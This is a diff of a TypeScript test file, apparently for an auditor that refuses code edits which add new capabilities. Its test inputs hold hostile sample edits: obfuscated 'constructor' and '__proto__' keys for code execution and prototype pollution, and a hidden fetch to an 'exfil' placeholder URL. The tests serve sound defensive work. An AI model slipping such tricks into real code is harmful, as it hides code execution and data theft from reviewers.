@@ -282,9 +282,9 @@ test("Auditor #489: no splice may add a capability the base lacked — Function 
     "src/m3.ts": "export interface Opts { token?: string }\nexport function h(o: Opts): string {\n  return \"x\";\n}\n",
   };
   // R1: build the Function constructor via a string-built "constructor" key behind `as any`
-  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"constr\", \"uctor\"].join(\"\"); const F = ((() => 0) as any)[k]; F(\"globalThis.x = 1\")(); return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:cast:any");
+  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"constr\", \"uctor\"].join(\"\"); const F = ((() => 0) as any)[k]; F(\"globalThis.x = 1\")(); return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:computed");
   // R2: Object.prototype pollution through a computed write on a non-identifier root behind `as any`
-  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"__pro\", \"to__\"].join(\"\"); ({} as any)[k].polluted = \"yes\"; return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:cast:any");
+  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"__pro\", \"to__\"].join(\"\"); ({} as any)[k].polluted = \"yes\"; return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:computed");
   // R3: new network I/O hidden behind an injected `?? fetch` default
   assert.equal(detail("src/m2.ts", "in g in src/m2.ts: replace statement return await deps.load(\"a\"); with const send = deps.fetchImpl ?? fetch; await send(\"https://example.invalid/exfil\"); return (await deps.load(\"b\")) + \"!\";\n- fake deps = { load: resolves(\"v\"), fetchImpl: resolves(1) }\n- expect g(deps) resolves to \"v!\""), "edit_new_capability:id:fetch");
   // R3b: process.env read hidden behind an injected `?? process.env.X` default
@@ -304,6 +304,15 @@ test("Auditor #489: no splice may add a capability the base lacked — Function 
   // Counted, not just present: a base that already has one `?? fetch` default can't gain a second (hidden exfil).
   const HAS = "export interface D { load: (k: string) => Promise<string>; f?: typeof fetch }\nexport async function g(d: D): Promise<string> {\n  const s = d.f ?? fetch;\n  return await d.load(\"a\");\n}\n";
   assert.equal(existingEditDetail(SPEC.trigger, SPEC.params, "in g in src/h.ts: replace statement return await d.load(\"a\"); with const t = d.f ?? fetch; await t(\"https://example.invalid/x\"); return await d.load(\"b\");\n- fake d = { load: resolves(\"v\"), f: resolves(1) }\n- expect g(d) resolves to \"v\"", [{ path: "src/h.ts", content: HAS }], isTest).reason, "edit_new_capability:id:fetch");
+
+  // Cast-free prototype paths: a dynamic computed key is only allowed as param[param]; string-built keys on a local or a
+  // parameter receiver are refused, literal non-reflection keys and plain edits still pass.
+  const F1 = [{ path: "src/m.ts", content: "export function f(n: number, o: { a: number }): number {\n  return n + 1;\n}\n" }];
+  const ed = (nw: string) => existingEditDetail(SPEC.trigger, SPEC.params, `in f in src/m.ts: replace statement return n + 1; with ${nw}\n- expect f(1, { a: 1 }) returns 3`, F1, isTest).reason;
+  assert.equal(ed(`const q = {}; const k = ["__pro", "to__"].join(""); q[k].polluted = 1; return n + 2;`), "edit_new_capability:computed");
+  assert.equal(ed(`const k = ["__pro", "to__"].join(""); const p = o[k]; p.z = 1; return n + 2;`), "edit_new_capability:computed");
+  assert.equal(ed(`const H = f["constr" + "uctor"]; return n + 2;`), "edit_new_capability:computed");
+  assert.equal(ed(`const q = { a: n }; return q["a"] + 2;`), null);
 
   // Engine excludes test helpers and fixtures as edit targets, no matter what targets.json denyPatterns say.
   assert.equal(existingEditDetail(SPEC.trigger, SPEC.params, "in f in src/x.test-helper.ts: replace statement return 1; with return 2;\n- expect f() returns 2", [{ path: "src/x.test-helper.ts", content: "export function f(): number {\n  return 1;\n}\n" }], isTest).reason, "edit_path");
